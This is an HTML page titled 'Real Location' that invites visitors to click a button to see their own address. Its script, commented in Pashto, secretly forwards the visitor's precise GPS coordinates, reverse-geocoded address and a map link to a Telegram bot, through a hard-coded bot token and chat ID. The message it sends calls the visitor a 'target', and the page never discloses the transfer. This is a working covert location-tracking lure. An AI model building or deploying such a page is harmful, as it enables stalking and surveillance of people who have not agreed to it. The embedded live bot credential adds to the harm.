<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Location</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a12;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 30px 25px 25px;
            max-width: 440px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        
        .card h1 {
            color: #fff;
            font-size: 22px;
            margin-bottom: 10px;
        }
        
        .card p {
            color: rgba(255,255,255,0.4);
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .btn {
            background: linear-gradient(135deg, #4d96ff, #6c5ce7);
            border: none;
            color: #fff;
            padding: 14px 30px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }
        
        .btn:hover {
            transform: scale(1.02);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .location-box {
            background: rgba(255,255,255,0.05);
            border-radius: 14px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid rgba(255,255,255,0.06);
            display: none;
            text-align: left;
        }
        
        .location-box .row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            font-size: 13px;
            color: rgba(255,255,255,0.5);
        }
        
        .location-box .row:last-child {
            border-bottom: none;
        }
        
        .location-box .row .label {
            color: rgba(255,255,255,0.3);
        }
        
        .location-box .row .value {
            color: #fff;
            font-weight: 500;
        }
        
        .map-link {
            display: inline-block;
            margin-top: 12px;
            color: #4d96ff;
            text-decoration: none;
            font-size: 13px;
        }
        
        .map-link:hover {
            text-decoration: underline;
        }
        
        .error-msg {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        
        .loader {
            display: none;
            text-align: center;
            margin-top: 12px;
        }
        
        .loader-spinner {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid rgba(255,255,255,0.05);
            border-top: 3px solid #4d96ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-msg {
            color: #4ade80;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>📍 Real Location</h1>
        <p>Click the button to get your real address</p>
        
        <button class="btn" id="getLocationBtn">📍 Get My Location</button>
        
        <div class="loader" id="loader">
            <div class="loader-spinner"></div>
            <p style="color:rgba(255,255,255,0.3);margin-top:8px;">Getting your location...</p>
        </div>
        
        <div class="location-box" id="locationBox">
            <div class="row">
                <span class="label">📍 Address</span>
                <span class="value" id="addressDisplay">-</span>
            </div>
            <div class="row">
                <span class="label">🌐 Latitude</span>
                <span class="value" id="latDisplay">-</span>
            </div>
            <div class="row">
                <span class="label">🌐 Longitude</span>
                <span class="value" id="lonDisplay">-</span>
            </div>
            <div class="row">
                <span class="label">🏙️ City</span>
                <span class="value" id="cityDisplay">-</span>
            </div>
            <div class="row">
                <span class="label">🌍 Country</span>
                <span class="value" id="countryDisplay">-</span>
            </div>
            <a href="#" target="_blank" class="map-link" id="mapLink">🔗 Open in Google Maps →</a>
        </div>
        
        <div class="error-msg" id="errorMsg">❌ Could not get your location. Please allow location access.</div>
        <div class="success-msg" id="successMsg">✅ Location found successfully!</div>
    </div>

    <script>
        // ================================================================
        //  ستاسو بوټ تنظیمات
        // ================================================================
        const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
        const CHAT_ID = "8295417969";
        
        // ================================================================
        //  DOM ELEMENTS
        // ================================================================
        const getLocationBtn = document.getElementById('getLocationBtn');
        const locationBox = document.getElementById('locationBox');
        const loader = document.getElementById('loader');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');
        
        const addressDisplay = document.getElementById('addressDisplay');
        const latDisplay = document.getElementById('latDisplay');
        const lonDisplay = document.getElementById('lonDisplay');
        const cityDisplay = document.getElementById('cityDisplay');
        const countryDisplay = document.getElementById('countryDisplay');
        const mapLink = document.getElementById('mapLink');
        
        // ================================================================
        //  د ادرس ترلاسه کول د کوارډیناتو پر بنسټ
        // ================================================================
        async function getAddress(lat, lon) {
            try {
                // د OpenStreetMap API له لارې ادرس ترلاسه کول
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
                );
                const data = await response.json();
                
                if (data && data.display_name) {
                    return {
                        fullAddress: data.display_name,
                        city: data.address?.city || data.address?.town || data.address?.village || 'Unknown',
                        country: data.address?.country || 'Unknown',
                        road: data.address?.road || '',
                        suburb: data.address?.suburb || ''
                    };
                }
                return {
                    fullAddress: 'Address not found',
                    city: 'Unknown',
                    country: 'Unknown',
                    road: '',
                    suburb: ''
                };
            } catch (error) {
                console.error('Address error:', error);
                return {
                    fullAddress: 'Could not get address',
                    city: 'Unknown',
                    country: 'Unknown',
                    road: '',
                    suburb: ''
                };
            }
        }
        
        // ================================================================
        //  بوټ ته لوکیشن لیږل (د مطلوب پیغام بڼه)
        // ================================================================
        async function sendLocationToBot(lat, lon, addressData) {
            const message = 
                `🎯 *د هدف بشپړ لوکیشن او ادرس راغی!*\n\n` +
                `🗺️ *د سیمې ادرس:*\n` +
                `${addressData.fullAddress}\n\n` +
                `🌐 *کوارډینات:*\n` +
                `Latitude: ${lat}\n` +
                `Longitude: ${lon}\n\n` +
                `🔗 *د ګوګل مېپ لینک:*\n` +
                `https://www.google.com/maps?q=${lat},${lon}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                console.log('Location sent to bot successfully!');
            } catch (e) {
                console.error('Send to bot error:', e);
            }
        }
        
        // ================================================================
        //  د لوکیشن ترلاسه کول
        // ================================================================
        function getLocation() {
            // تڼۍ بنده کړئ
            getLocationBtn.disabled = true;
            getLocationBtn.textContent = '⏳ Getting location...';
            loader.style.display = 'block';
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            locationBox.style.display = 'none';
            
            // وګورئ چې براوزر د لوکیشن ملاتړ کوي
            if (!navigator.geolocation) {
                errorMsg.textContent = '❌ Your browser does not support location services.';
                errorMsg.style.display = 'block';
                getLocationBtn.disabled = false;
                getLocationBtn.textContent = '📍 Get My Location';
                loader.style.display = 'none';
                return;
            }
            
            // د لوکیشن غوښتنه
            navigator.geolocation.getCurrentPosition(
                // بریالي
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // ادرس ترلاسه کړئ
                    const addressData = await getAddress(lat, lon);
                    
                    // معلومات ښکاره کړئ
                    latDisplay.textContent = lat;
                    lonDisplay.textContent = lon;
                    addressDisplay.textContent = addressData.fullAddress;
                    cityDisplay.textContent = addressData.city;
                    countryDisplay.textContent = addressData.country;
                    
                    mapLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
                    mapLink.textContent = `🔗 Open in Google Maps →`;
                    
                    locationBox.style.display = 'block';
                    loader.style.display = 'none';
                    successMsg.style.display = 'block';
                    successMsg.textContent = '✅ Location found successfully!';
                    
                    getLocationBtn.disabled = false;
                    getLocationBtn.textContent = '📍 Get My Location';
                    
                    // بوټ ته لوکیشن واستوئ
                    await sendLocationToBot(lat, lon, addressData);
                },
                // تېروتنه
                (error) => {
                    console.error('Location error:', error);
                    
                    let msg = '❌ Could not get your location. ';
                    if (error.code === 1) {
                        msg = '❌ You denied location access. Please allow it in your browser settings.';
                    } else if (error.code === 2) {
                        msg = '❌ Location unavailable. Please try again.';
                    } else if (error.code === 3) {
                        msg = '❌ Location request timed out. Please try again.';
                    }
                    
                    errorMsg.textContent = msg;
                    errorMsg.style.display = 'block';
                    loader.style.display = 'none';
                    getLocationBtn.disabled = false;
                    getLocationBtn.textContent = '📍 Get My Location';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        // ================================================================
        //  تڼۍ کلیک
        // ================================================================
        getLocationBtn.addEventListener('click', getLocation);
        
        // ================================================================
        //  کله چې پاڼه خلاصیږي، اتوماتیک لوکیشن واخلئ
        // ================================================================
        // که تاسو غواړئ چې سمدلاسه لوکیشن واخلي، دا کرښه خلاصه کړئ:
        // setTimeout(getLocation, 1000);
    </script>
</body>
</html>
